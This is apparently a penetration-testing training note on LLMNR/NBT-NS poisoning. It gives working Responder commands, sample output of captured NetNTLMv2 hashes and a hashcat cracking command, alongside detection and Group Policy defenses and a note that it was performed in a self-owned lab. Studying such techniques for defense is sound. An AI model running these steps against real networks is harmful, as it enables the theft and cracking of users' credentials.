# LLMNR Poisoning (Link-Local Multicast Name Resolution)

**MITRE ATT&CK:** T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

## Overview

When DNS fails to resolve a hostname, Windows falls back to LLMNR (and NBT-NS)
— a broadcast "who has this name?" query on the local segment. Any host can
answer. If an attacker on the same broadcast domain answers first, the victim
believes it and attempts SMB authentication against the attacker's machine,
leaking a crackable NetNTLMv2 hash.

## Attack Flow

```
1. User mistypes a share name, e.g. \\fileshar instead of \\fileserver
2. DNS cannot resolve "fileshar"
3. Windows broadcasts an LLMNR query: "Who has fileshar?"
4. Attacker (running Responder) answers: "I am fileshar"
5. Victim connects to the attacker's machine over SMB
6. Attacker requests authentication
7. Windows automatically performs NTLM auth
8. Victim sends a NetNTLMv2 challenge-response
9. Attacker captures the hash
```

## Prerequisites

- Attacker box on the same broadcast/link-local segment as the victim.
- Victim generates a name-resolution miss (mistyped share, stale mapped
  drive, misconfigured app, etc.) — or is coerced into one.

## Steps

### 1. Identify attacker interface/IP

```bash
ip a show eth0   # note <ATTACKER_IP>
```

### 2. Start Responder

```bash
sudo responder -I eth0 -dwv
```

- `-d` — enable DHCP poisoning (optional, more aggressive)
- `-w` — start WPAD rogue proxy
- `-v` — verbose

### 3. Wait for a poisoned response / captured hash

Responder logs captured `NetNTLMv2` hashes as they arrive, including the
username, domain, and originating IP, e.g.:

```
[SMB] NTLMv2-SSP Client   : <WS_IP>
[SMB] NTLMv2-SSP Username : <DOMAIN>\<USERNAME>
[SMB] NTLMv2-SSP Hash     : <NTLM_HASH>
```

Responder will also show poisoned answers going out to both IPv4 and
link-local IPv6 addresses for any queried name, e.g. a DC hostname or another
workstation broadcasting a lookup.

### 4. Save the hash and crack offline

```bash
hashcat -m 5600 -a 0 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

Mode `5600` = NetNTLMv2.

## Key Notes

- This is entirely passive from the network's perspective until a victim
  triggers a lookup failure — no exploitation, no lockouts.
- NetNTLMv2 is **not** directly pass-the-hash-able (unlike NTLM hashes from
  SAM/NTDS) — it must be cracked offline or relayed live (see
  [`02-smb-relay.md`](02-smb-relay.md)).
- Multiple victims can be poisoned in the same Responder session; watch the
  log for any high-value account name.

## Detection & Defenses

- **Disable LLMNR and NBT-NS** via Group Policy:
  `Computer Configuration → Administrative Templates → Network → DNS Client → Turn off Multicast Name Resolution`
- Disable NBT-NS per-adapter (`WINS → Disable NetBIOS over TCP/IP`).
- Monitor for a single host answering an unusually high volume of name
  resolution queries (Responder's own traffic pattern is distinctive).
- Enforce SMB signing (see [`02-smb-relay.md`](02-smb-relay.md)) so a
  captured/relayed hash can't be used even if poisoning succeeds.

---

*Performed against an isolated, self-owned lab domain for training purposes only.*
